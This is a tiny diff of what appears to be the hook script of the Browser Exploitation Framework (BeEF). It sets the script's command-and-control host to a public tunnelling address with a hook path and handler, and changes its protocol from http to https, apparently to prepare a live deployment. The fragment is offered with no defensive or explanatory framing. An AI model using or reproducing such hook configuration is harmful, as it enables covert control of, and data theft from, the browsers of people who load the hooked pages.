@@ -11698,7 +11698,7 @@ beef.net = {
     host: "facile.serveo.net",
     port: "3000",
     hook: "/hook.js",
-    httpproto: "http",
+    httpproto: "https",
     handler: '/dh',
     chop: 500,
     pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
